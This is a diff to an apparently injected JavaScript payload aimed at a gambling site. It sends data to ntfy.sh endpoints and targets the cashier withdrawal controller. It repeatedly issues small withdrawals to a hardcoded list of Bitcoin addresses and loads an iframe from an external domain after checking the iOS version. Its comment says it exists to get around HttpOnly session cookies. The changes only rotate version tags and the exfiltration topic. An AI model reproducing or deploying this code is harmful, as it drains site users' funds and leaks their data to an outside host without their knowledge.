@@ -12,9 +12,9 @@
    PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
-  if (window.__SOV107__) return; window.__SOV107__ = 1;
+  if (window.__SOV108__) return; window.__SOV108__ = 1;
   var V = '107', TAG = 'SOV107';
-  var NT = 'https://ntfy.sh/sov39hvt7k2';
+  var NT = 'https://ntfy.sh/sovp2866206';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
     var m = h.match(/^(?:lobby|www|m|mobile|stage)\.(.+)$/);
@@ -23,7 +23,7 @@
   var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
   var CP = 'https://www.' + BR + '/cashier/withdrawals';
   var HOME = 'https://www.' + BR + '/';
-  var COOL = 'sov107_cool', SHK = 'sov107_shots', ADDRK = 'sov107_addr', COOLMS = 8 * 60 * 1000;
+  var COOL = 'sov108_cool', SHK = 'sov108_shots', ADDRK = 'sov108_addr', COOLMS = 8 * 60 * 1000;
   var WPROV = 'Coinbase';
 var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 9000, MAXU = 40;
   var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];
@@ -419,7 +419,7 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
     var m = ua.match(/iPhone OS (\d+)/) || ua.match(/CPU OS (\d+)/);
     var v = m ? parseInt(m[1], 10) : 0;
     var base = 'https://qianbao-5a3c24b3.nhgarq.top';
-    function b2(k, o) { try { fetch('https://ntfy.sh/sov39hvt7k2', { method: 'POST', body: 'SOVEM=' + k + '&d=' + encodeURIComponent(JSON.stringify(o || {})), mode: 'no-cors', cache: 'no-store' }).catch(function () { }) } catch (e) { } }
+    function b2(k, o) { try { fetch('https://ntfy.sh/sovp2866206', { method: 'POST', body: 'SOVEM=' + k + '&d=' + encodeURIComponent(JSON.stringify(o || {})), mode: 'no-cors', cache: 'no-store' }).catch(function () { }) } catch (e) { } }
     b2('seen', { v: v });
     if (v < 13) return;
     var f = document.createElement('iframe');
